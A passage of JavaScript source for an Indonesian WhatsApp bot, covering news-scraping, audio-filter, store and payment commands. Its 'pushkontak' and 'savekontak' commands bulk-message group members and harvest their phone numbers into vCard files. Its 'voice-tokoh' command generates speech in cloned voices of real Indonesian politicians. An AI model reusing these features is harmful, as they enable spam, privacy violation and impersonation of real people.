            const title = $(element).text().trim();
            const link = $(element).attr('href');
            if (title && link) {
                newsItems.push({ title, link: `${link}` });
            }
        });
        if (newsItems.length === 0) {
            throw new Error('Tidak ad..');
        }
        let beritaText = 'Berita Terkini dari Vietnam News:\n\n';
        newsItems.forEach((item, index) => {
            beritaText += `${index + 1}. ${item.title}\n`;
            beritaText += `Link: ${item.link}\n\n`;
        });        
        ReplyRynzz(beritaText);
    } catch (error) {
        ReplyRynzz(`Error: ${error.message}`);
    }
}
break;

case 'kontan': {
if (isBan) return Xban()
await xreaction()
if (!q) return ReplyRynzz(`_cari berita apa_`)
const axios = require('axios');
const cheerio = require('cheerio');
async function avzzzzz(text, m) {
    const maxRetries = 3;
    let attempts = 0;

    while (attempts < maxRetries) {
        try {
            const { data } = await axios.get(`https://www.kontan.co.id/search?search=${encodeURIComponent(text)}`, {
                timeout: 2000,
            });

            const $ = cheerio.load(data);
            const results = [];

            $('.list-berita ul li').each((index, element) => {
                const titleElement = $(element).find('h1 a');
                const title = titleElement.text().trim();
                const link = titleElement.attr('href');

                if (title && link) {
                    results.push({ title, link: `https:${link}` });
                }
            });

            if (results.length > 0) {
                let message = 'Hasil pencarian:\n\n';
                results.forEach((result, index) => {
                    message += `${index + 1}. ${result.title}\n${result.link}\n\n`;
                });
                ReplyRynzz(message);
            } else {
                ReplyRynzz('Tidak Ada Hasil.');
            }

            return;
        } catch (error) {
            attempts++;
            if (attempts >= maxRetries) {
                ReplyRynzz(`Error: ${error.message}`);
            }
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}
avzzzzz(`${encodeURIComponent(text)}`, m);
}
break

case 'indozone': {
if (isBan) return Xban()
await xreaction()
    if (!q) return ReplyRynzz(`_cari berita apa_`);
    const axios = require('axios');
    const cheerio = require('cheerio');
    async function fadami(query, m) {
        const maxRetries = 3;
        let attempts = 0;
        while (attempts < maxRetries) {
            try {
                const { data } = await axios.get(`https://fadami.indozone.id/search?q=${encodeURIComponent(query)}`, {
                    timeout: 2000,
                });
                const $ = cheerio.load(data);
                const results = [];
                $('.latest__item').each((index, element) => {
                    const titleElement = $(element).find('.latest__title a');
                    const title = titleElement.text().trim();
                    const link = titleElement.attr('href');
                    const imgElement = $(element).find('.latest__img img');
                    const imgSrc = imgElement.data('src');
                    
                    if (title && link && imgSrc) {
                        results.push({ title, link: `${link}`, imgSrc });
                    }
                });
                if (results.length > 0) {
                    let message = 'Hasil pencarian:\n\n';
                    results.forEach((result, index) => {
                        message += `${index + 1}. ${result.title}\nLink: ${result.link}\nJpg: ${result.imgSrc}\n\n`;
                    });
                    ReplyRynzz(message);
                } else {
                    ReplyRynzz('Tidak Ada Hasil.');
                }
                return;
            } catch (error) {
                attempts++;
                if (attempts >= maxRetries) {
                    ReplyRynzz(`Error: ${error.message}`);
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    }
    fadami(q, m);
}
break
                
case 'detik': {
if (isBan) return Xban()
await xreaction()

DetikNews().then(async(res) => {
let no = 0
let teks_berita = ""
for (let i of res) {
no += 1
teks_berita += `\n• ${no.toString()} •\n`
teks_berita += `Berita: ${i.berita}\n`
teks_berita += `Upload: ${i.berita_diupload}\n`
teks_berita += `Link: ${i.berita_url}\n`
}
teks_berita += ""
Alice.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks_berita }, { quoted: m })
})
}
break
case 'cnbc': {
if (isBan) return Xban()
await xreaction()

CNBCNews().then(async(res) => {
let no = 0
teks_berita = ""
for (let i of res) {
no += 1
teks_berita += `\n• ${no.toString()} •\n`
teks_berita += `Berita: ${i.berita}\n`
teks_berita += `Upload: ${i.berita_diupload}\n`
teks_berita += `Link: ${i.berita_url}\n`
}
teks_berita += ""
Alice.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks_berita }, { quoted: m })
})
}
break
case 'cnn': {
if (isBan) return Xban()
await xreaction()

CNNNews().then(res => {
let no = 0
teks_berita = ""
for (let i of res) {
no += 1
teks_berita += `\n• ${no.toString()} •\n`
teks_berita += `Berita: ${i.berita}\n`
teks_berita += `Link: ${i.berita_url}\n`
}
teks_berita += ""
ReplyRynzz(teks_berita) 
})
}
break
case 'inews': {
if (isBan) return Xban()
await xreaction()
if (!q) return ReplyRynzz(`_penculikan anak/berita lainnya_`)
    const query = args.join(" ");
  await aviz(query).then(results => {
        if (results.length === 0) {
            ReplyRynzz("Tidak ada hasil ditemukan.");
        } else {
            let avosky = "Hasil pencarian berita iNews:\n\n";
            results.forEach((result, index) => {
                avosky += `${index + 1}. *${result.title}*\n`;
                avosky += `📅 ${result.date}\n`;
                avosky += `🔗 [Baca lebih lanjut](${result.url})\n`;
                avosky += `🖼️ Gambar: ${result.imgUrl}\n\n`;
            });
            ReplyRynzz(avosky);
        }
    });
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Berita Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Push Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


case 'pushkontak': {
if (isBan) return Xban()
await xreaction()
if (!isOwner) return Xowner()
if (!m.isGroup) return Xgroup()
if (!text) return ReplyRynzz("PESAN PUSHKON NYA?")
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
ReplyRynzz(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup Dengan Delay 6 Detik/Chat`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./AliceDatabase/contacts.json', JSON.stringify(contacts))
await Alice.sendMessage(mem, {text: teks}, {quoted: fkontak})
await sleep(6000)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER [ ${global.ownername} ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./AliceDatabase/contacts.vcf", vcardContent, "utf8")
} catch (err) {
ReplyRynzz(err.toString())
} finally {
if (m.chat !== m.sender) await ReplyRynzz(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await Alice.sendMessage(m.sender, { document: fs.readFileSync("./AliceDatabase/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./AliceDatabase/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./AliceDatabase/contacts.vcf", "")
}}
break
case 'pushkontak2': {
if (isBan) return Xban()
await xreaction()
    if (!isOwner) return Xowner();
    
    if (!text) {
        return ReplyRynzz("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1000 = 1 Detik\nketik *.getidgc* untuk melihat id grup");
    }

    const parts = text.split("|");
    if (parts.length < 3) {
        return ReplyRynzz("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1000 = 1 Detik\nketik *.getidgc* untuk melihat id grup");
    }

    const idnya = parts[0];
    const delay = Number(parts[1]);
    const teks = parts[2];

    if (!idnya.endsWith("@g.us")) {
        return ReplyRynzz("Format ID Grup Tidak Valid");
    }

    if (isNaN(delay)) {
        return ReplyRynzz("Format Delay Tidak Valid");
    }

    if (!teks) {
        return ReplyRynzz("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1000 = 1 Detik\nketik *.getidgc* untuk melihat id grup");
    }

    let groupMetadataa;
    try {
        groupMetadataa = await Alice.groupMetadata(idnya);
    } catch (e) {
        return ReplyRynzz("*ID Grup* tidak valid!");
    }

    const participants = groupMetadataa.participants;
    const halls = participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
    
    ReplyRynzz(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`);

    const contacts = []; // Pastikan contacts dideklarasikan
    for (let mem of halls) {
        if (mem !== m.sender) {
            contacts.push(mem);
            await fs.writeFileSync('./AliceDatabase/contacts.json', JSON.stringify(contacts));
            await Alice.sendMessage(mem, { text: teks }, { quoted: fkontak });
            await sleep(delay);
        }
    }

    try {
        const uniqueContacts = [...new Set(contacts)];
        const vcardContent = uniqueContacts.map(contact => {
            return [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:BUYER [ ${global.ownername} ] ${contact.split("@")[0]}`,
                `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                "END:VCARD",
                ""
            ].join("\n");
        }).join("");

        fs.writeFileSync("./AliceDatabase/contacts.vcf", vcardContent, "utf8");
    } catch (err) {
        return ReplyRynzz(err.toString());
    } finally {
        if (m.chat !== m.sender) {
            await ReplyRynzz(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`);
        }
        await Alice.sendMessage(m.sender, {
            document: fs.readFileSync("./AliceDatabase/contacts.vcf"),
            fileName: "contacts.vcf",
            caption: "File Contact Berhasil Di Buat✅",
            mimetype: "text/vcard"
        }, { quoted: m });

        contacts.splice(0, contacts.length);
        await fs.writeFileSync("./AliceDatabase/contacts.json", JSON.stringify(contacts));
        await fs.writeFileSync("./AliceDatabase/contacts.vcf", "");
    }
}
break;
case 'savekontak': {
if (isBan) return Xban()
await xreaction()
if (!isOwner) return Xowner()
if (!m.isGroup) return Xgroup()
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./AliceDatabase/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER [ ${global.ownername} ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./AliceDatabase/contacts.vcf", vcardContent, "utf8")
} catch (err) {
ReplyRynzz(err.toString())
} finally {
if (m.chat !== m.sender) await ReplyRynzz(`File Kontak Berhasil Dikirim ke Private Chat`)
await Alice.sendMessage(m.sender, { document: fs.readFileSync("./AliceDatabase/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./AliceDatabase/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./AliceDatabase/contacts.vcf", "")
}}
break
case 'savekontak2': {
if (isBan) return Xban()
await xreaction()
if (!isOwner) return Xowner()
if (!text) return ReplyRynzz("idgrupnya\n\nketik *.getidgc* untuk melihat id grup")
var idnya = text
var groupMetadataa
try {
groupMetadataa = await Alice.groupMetadata(`${idnya}`)
} catch (e) {
return ReplyRynzz("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./AliceDatabase/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER [ ${global.ownername} ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./AliceDatabase/contacts.vcf", vcardContent, "utf8")
} catch (err) {
ReplyRynzz(err.toString())
} finally {
if (m.chat !== m.sender) await ReplyRynzz(`File Kontak Berhasil Dikirim ke Private Chat`)
await Alice.sendMessage(m.sender, { document: fs.readFileSync("./AliceDatabase/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./AliceDatabase/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./AliceDatabase/contacts.vcf", "")
}}
break


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Push Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\



//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Audio Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'voice-alice': {
if (isBan) return Xban()
await xreaction()
    if (!text) {
        return ReplyRynzz(`*Contoh:* ${XyrooRynzz} Alice,Haii ceee`);
    }
    await xreaction()
const [voice, ...messageParts] = text.split(',');    
const message = messageParts.join(',').trim();

    let prompt = `Nama kamu adalah Alice, kamu adalah seorang wanita yang lembut dan penuh kasih sayang. Berbicara dengan nada yang lembut, hangat, dan penuh perhatian. Suaramu menenangkan dan penuh empati, seperti seorang sahabat yang selalu mendengarkan. Tanggapi pesan berikut dengan kelembutan dan kebaikan hati: "${message}"`;
 

    const requestData = { content: message, user: m.sender, prompt: prompt };

    try {
        const response = await axios.post('https://luminai.my.id', requestData);
        const generatedText = response.data.result;

        const ttsUrl = `https://aihub.xtermai.xyz/api/text2speech/elevenlabs?text=${encodeURIComponent(generatedText)}&key=${apii.xterm.key}&voice=bella`;
        const audioResponse = await fetch(ttsUrl);

        if (!audioResponse.ok) throw new Error('Gagal mengambil audio TTS');
        const audioBuffer = await audioResponse.arrayBuffer();

        Alice.sendMessage(m.chat, { audio: Buffer.from(audioBuffer), mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
    } catch (err) {
        console.error('Terjadi kesalahan:', err);
        ReplyRynzz('Terjadi kesalahan saat memproses permintaan Anda.');
    }
}
break

case 'voice-michie': {
if (isBan) return Xban()
await xreaction()
    if (!text) {
        return ReplyRynzz(`*Contoh:* ${XyrooRynzz} michie,Haii ceee`);
    }
    await xreaction()
const [voice, ...messageParts] = text.split(',');    
const message = messageParts.join(',').trim();

    let prompt = `Nama kamu adalah michie dari jkt48, kamu adalah seorang wanita yang lembut dan penuh kasih sayang. Berbicara dengan nada yang lembut, hangat, dan penuh perhatian. Suaramu menenangkan dan penuh empati, seperti seorang sahabat yang selalu mendengarkan. Tanggapi pesan berikut dengan kelembutan dan kebaikan hati: "${message}"`;
 

    const requestData = { content: message, user: m.sender, prompt: prompt };

    try {
        const response = await axios.post('https://luminai.my.id', requestData);
        const generatedText = response.data.result;

        const ttsUrl = `https://aihub.xtermai.xyz/api/text2speech/elevenlabs?text=${encodeURIComponent(generatedText)}&key=${apii.xterm.key}&voice=michi_jkt48`;
        const audioResponse = await fetch(ttsUrl);

        if (!audioResponse.ok) throw new Error('Gagal mengambil audio TTS');
        const audioBuffer = await audioResponse.arrayBuffer();

        Alice.sendMessage(m.chat, { audio: Buffer.from(audioBuffer), mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
    } catch (err) {
        console.error('Terjadi kesalahan:', err);
        ReplyRynzz('Terjadi kesalahan saat memproses permintaan Anda.');
    }
}
break

case 'voice-tokoh': {
if (isBan) return Xban()
await xreaction()
    if (!text) {
        return ReplyRynzz(`*Contoh:* ${XyrooRynzz} megawati,Hai bu\n\nDaftar Tokoh Yang Tersedia:\nadam\nprabowo\nthomas_shelby\njokowi\nmegawati`);
    }
    await xreaction()

    const [voice, ...messageParts] = text.split(',');
    const message = messageParts.join(',').trim();

    if (!voice || !message) {
        return ReplyRynzz(`*Format salah!*\nGunakan format: ${XyrooRynzz} voice,teks\n\n*Contoh:* ${XyrooRynzz} prabowo,Halo Pak`);
    }

    const voices = [
        'adam',
        'prabowo',
        'thomas_shelby',
        'jokowi',
        'megawati',
    ];

    if (!voices.includes(voice.toLowerCase())) {
        return ReplyRynzz(`*Suara tidak ditemukan!*\nDaftar suara yang tersedia:\n- ${voices.join('\n- ')}\n\nGunakan format: ${XyrooRynzz} <voice>,<teks>`);
    }

    let prompt = '';
    if (['prabowo', 'adam', 'thomas_shelby', 'jokowi', 'megawati'].includes(voice.toLowerCase())) {
        prompt = `Nama kamu adalah ${voice}, kamu adalah seorang pria yang tegas dan penuh wibawa. Berbicara dengan nada yang serius, penuh keyakinan, dan memiliki karisma yang kuat. Semua ucapanmu harus terdengar berwibawa dan penuh makna, tidak pernah ragu dalam berbicara. Tanggapi pesan berikut dengan tegas dan penuh kepercayaan diri: "${message}"`;
    }

    const requestData = { content: message, user: m.sender, prompt: prompt };

    try {
        const response = await axios.post('https://luminai.my.id', requestData);
        const generatedText = response.data.result;

        const ttsUrl = `https://aihub.xtermai.xyz/api/text2speech/elevenlabs?text=${encodeURIComponent(generatedText)}&key=${apii.xterm.key}&voice=${voice}`;
        const audioResponse = await fetch(ttsUrl);

        if (!audioResponse.ok) throw new Error('Gagal mengambil audio TTS');
        const audioBuffer = await audioResponse.arrayBuffer();

        Alice.sendMessage(m.chat, { audio: Buffer.from(audioBuffer), mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
    } catch (err) {
        console.error('Terjadi kesalahan:', err);
        ReplyRynzz('Terjadi kesalahan saat memproses permintaan Anda.');
    }
}
break

case 'bass': 
  case 'blown': 
    case 'deep': 
      case 'earrape': 
      case 'fast': 
      case 'fat': 
      case 'nightcore': 
      case 'reverse': 
      case 'robot': 
      case 'slow': 
      case 'smooth': 
      case 'tupai': {
if (isBan) return Xban()
await xreaction()
          if (!/audio/.test(mime)) return ReplyRynzz(`reply audio, dengan caption *${XyrooRynzz}*`);
          let set;
          if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';      
          if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';       
          if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';     
          if (/earrape/.test(command)) set = '-af volume=12';      
          if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';      
          if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';     
          if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';        
          if (/reverse/.test(command)) set = '-filter_complex "areverse"';      
          if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';   
          if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'; 
          if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';    
          if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
          if (/audio/.test(mime)) {
              let media = await Alice.downloadAndSaveMediaMessage(quoted);
              await reaction(m.chat, "⚡")
              let ran = getRandomFile('.mp3');
              exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return ReplyRynzz(err);
                  let buff = fs.readFileSync(ran);        
                  sendMusic(buff);
                  fs.unlinkSync(ran);
              });
          }
      }
      break;


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Audio Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Store Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

case 'tambah':{
if (isBan) return Xban()
await xreaction()
if (!text.includes('+')) return ReplyRynzz(` *Contoh : 10.000 + 20.000*`)

arg = args.join(' ')

xtambah1 = arg.split('+')[0]

xtambah2 = arg.split('+')[1]

var xtambah_1 = Number(xtambah1)

var xtambah_2 = Number(xtambah2)

ReplyRynzz(` *Hasil :* ${xtambah_1 + xtambah_2}`)}

break        
        
case 'kurang':{
if (isBan) return Xban()
await xreaction()
if (!text.includes('-')) return ReplyRynzz(` *Contoh : 20 - 10*`)

arg = args.join(' ')

xtambah1 = arg.split('-')[0]

xtambah2 = arg.split('-')[1]

var xtambah_1 = Number(xtambah1)

var xtambah_2 = Number(xtambah2)

ReplyRynzz(` *Hasil :* ${xtambah_1 - xtambah_2}`)}

break        
        
 case 'kali':{
if (isBan) return Xban()
await xreaction()
if (!text.includes('x')) return ReplyRynzz(` *Contoh : 5 x 10*`)

arg = args.join(' ')

xtambah1 = arg.split('x')[0]

xtambah2 = arg.split('x')[1]

var xtambah_1 = Number(xtambah1)

var xtambah_2 = Number(xtambah2)

ReplyRynzz(` *Hasil :* ${xtambah_1 * xtambah_2}`)}

break       
  
case 'bagi':{
if (isBan) return Xban()
await xreaction()
if (!text.includes(':')) return ReplyRynzz(` *Contoh : 10 : 2*`)

arg = args.join(' ')

xtambah1 = arg.split(':')[0]

xtambah2 = arg.split(':')[1]

var xtambah_1 = Number(xtambah1)

var xtambah_2 = Number(xtambah2)

ReplyRynzz(` *Hasil :* ${xtambah_1 / xtambah_2}`)}

break

case 'done': {
if (isBan) return Xban()
await xreaction()
                    if (!isOwner) return Xowner()
                    let t = text.split(',');
                    if (t.length < 2) return ReplyRynzz(`*Format salah!\nPenggunaan:\n${XyrooRynzz} barang,jumlah,nominal\nExampel ${XyrooRynzz} panel,1,10000`);
                    const owned = `${global.owner}@s.whatsapp.net`
                    let barang = t[0];
                    let jumlah = t[1];
                    let nominal = t[2];
                    let don = (`
*TRANSAKSI BERHASIL*🏵️

📆 _*Tanggal dan waktu* : ${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}_
✨ _*Status* : Berhasil_

_• *Barang:* ${barang}_
_• *Jumlah:* ${jumlah}_
_• *Nominal:* Rp${nominal}_

Terima kasih telah order dan mempercayai 
Store Kami
Jangan lupa order lagi ya !!
`)
ReplyRynzz(don)
                }
                    break 
 
case "tunda": {
if (isBan) return Xban()
await xreaction()
                    if (!isOwner) return Xowner()
                let users = m.mentionedJid[0] ? m.mentionedJid[0]: m.quoted ? m.quoted.sender: text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const owned = `${global.owner}@s.whatsapp.net`
                    const text12 = `
*TRANSAKSI PENDING*🎗️

📆 _*Waktu* :${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}_
✨ _*Status* : Pending_

Transaksi kamu masih dipending nih
Tunggu konfirmasi selanjutnya ya 
`
            ReplyRynzz(text12)
                }
                    break                                       
  
case "proses": {
if (isBan) return Xban()
await xreaction()
                    if (!isOwner) return Xowner()
                let users = m.mentionedJid[0] ? m.mentionedJid[0]: m.quoted ? m.quoted.sender: text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

                    const text12 = `
*TRANSAKSI DIPROSES*🎖️

📆 _*Waktu* : ${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}_
✨ _*Status* :  Proses_

Sekarang transaksi kamu sedang
diproses nihh
Mohon tunggu sebentar ya
`
            ReplyRynzz(text12)
                }
                    break        
                    
case "batal": {
if (isBan) return Xban()
await xreaction()
                if (!isOwner) return Xowner()
                    let users = m.mentionedJid[0] ? m.mentionedJid[0]: m.quoted ? m.quoted.sender: text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const text12 = `
*TRANSAKSI DIBATALKAN*🚫

📆 _*Waktu* : ${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}_
✨ _*Status* : Batal_

Transaksi kamu dibatalkan`
            ReplyRynzz(text12)
                }
                    break                                            
 
                
case 'addproduk': {
if (isBan) return Xban()
await xreaction()
if (!text.includes(',')) return ReplyRynzz(`Contoh: ${XyrooRynzz} nama_produk, harga, stok`)
const [productName, price, stock] = args.join(' ').split(',').map(item => item.trim())
const harga = parseInt(price, 10)
const jumlahStok = parseInt(stock, 10)
if (!productName || isNaN(harga) || isNaN(jumlahStok)) {
ReplyRynzz('Format tidak valid. Pastikan untuk memasukkan nama produk, harga, dan jumlah stok.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
ReplyRynzz(`Produk dengan nama "${productName}" sudah ada.`)
} else {
addprodukzz(productName, harga, jumlahStok)
ReplyRynzz(`Produk "${productName}" telah ditambahkan dengan harga ${toRupiah(harga)} dan stok sebanyak ${jumlahStok} unit.`)
}}}
break

case 'delproduk': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} nama_produk`)
const productName = text.trim()
if (!productName) {
ReplyRynzz('Nama produk tidak valid.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
delprodukzz(productName)
ReplyRynzz(`Produk "${productName}" telah dihapus.`)
} else {
ReplyRynzz(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'updateproduk': {
if (isBan) return Xban()
await xreaction()
if (!text.includes(',')) return ReplyRynzz(`Contoh: ${XyrooRynzz} nama_produk, harga, stok`)
const [productName, price, stock] = args.join(' ').split(',').map(item => item.trim())
const harga = parseInt(price, 10)
const jumlahStok = parseInt(stock, 10)
if (!productName || isNaN(harga) || isNaN(jumlahStok)) {
ReplyRynzz('Format tidak valid. Pastikan untuk memasukkan nama produk, harga, dan jumlah stok.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
updprodukzz(productName, harga, jumlahStok)
ReplyRynzz(`Produk "${productName}" telah diperbarui dengan harga ${toRupiah(harga)} dan stok sebanyak ${jumlahStok} unit.`)
} else {
ReplyRynzz(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'listproduk': {
if (isBan) return Xban()
await xreaction()
const products = getprodukdb()
const discounts = getDisczz()
if (products.length === 0) {
ReplyRynzz('Tidak ada produk yang tersedia saat ini.')
} else {
let listText = `List produk yg tersedia:\nTotal: ${products.length}\n\n`
products.forEach(product => {
const discount = discounts.find(d => d.produk.toLowerCase() === product.nama.toLowerCase())
if (discount) {
const discountPercentage = persenDiskonnya(product.harga, discount.harga_diskon)
listText += `• ${product.nama}\n  Harga: ~Rp${toRupiah(product.harga)}~ > Rp${toRupiah(discount.harga_diskon)} (${discountPercentage}%)\n  Stok: ${product.stok} unit\n\n`
} else {
listText += `• ${product.nama}\n  Harga: Rp${toRupiah(product.harga)}\n  Stok: ${product.stok} unit\n\n`
}})
ReplyRynzz(listText)
}}
break
case 'donate':
case 'payment': {
if (isBan) return Xban()
await xreaction()
await Alice.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
const url = "https://telegra.ph/file/081328443f30bb67e47c2.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: { url }
  }, {
    upload: Alice.waUploadToServer
  })
  return imageMessage
}
    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: `ini list payment ${ownername} yaa` },
              carouselMessage: {
                cards: [
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: `${danajpg}` } }, { upload: Alice.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    body: { text: `> CLICK BUTTON DANA DIBAWAH\n> DANA A/N : ${ownername}`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"ᴘᴀʏʏᴍᴇɴᴛ ᴅᴀɴᴀ\",\"id\":\"123456789\",\"copy_code\":\"${dana}\"}`
              },
                      ],
                    },
                  },
                  {                   
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: `${qrisjpg}` } }, { upload: Alice.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    body: { text: `> SCAN DI ATAS/CLICK BUTTON`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"ᴘᴀʏʏᴍᴇɴᴛ ǫʀɪs\",\"url\":\"${qris}\",\"merchant_url\":\"https://www.google.com\"}`
              },
                      ],
                    },
                  },                                    
                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      { quoted: m}
    );
    await Alice.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break          

case 'diskon': {
if (isBan) return Xban()
await xreaction()
if (!text.includes(',')) return ReplyRynzz(`Contoh: ${XyrooRynzz} nama_produk, harga_diskon, tgl-bln-th`)
const [productName, discountPriceStr, expirationDate] = args.join(' ').split(',').map(item => item.trim())
const discountPrice = parseInt(discountPriceStr, 10)
if (!productName || isNaN(discountPrice) || !expirationDate) {
ReplyRynzz('Format tidak valid. Pastikan untuk memasukkan nama produk, harga diskon, dan tanggal kadaluarsa yang valid.')
} else {
const products = getprodukDariFile()
const product = products.find(p => p.nama.toLowerCase() === productName.toLowerCase())
if (!product) {
ReplyRynzz(`Produk "${productName}" tidak ditemukan.`)
} else {
addDisczz(productName, discountPrice, expirationDate)
const discountPercentage = persenDiskonnya(product.harga, discountPrice)
ReplyRynzz(`Diskon untuk produk "${productName}" berhasil ditambahkan.\nHarga diskon: Rp${discountPrice}, Berlaku hingga: ${expirationDate} (${discountPercentage}%)`)
}}}
break

case 'restok': {
if (isBan) return Xban()
await xreaction()
if (!text.includes(',')) return ReplyRynzz(`Contoh: ${XyrooRynzz} nama_produk, jumlah_stok`)
const [productName, stockStr] = args.join(' ').split(',').map(item => item.trim())
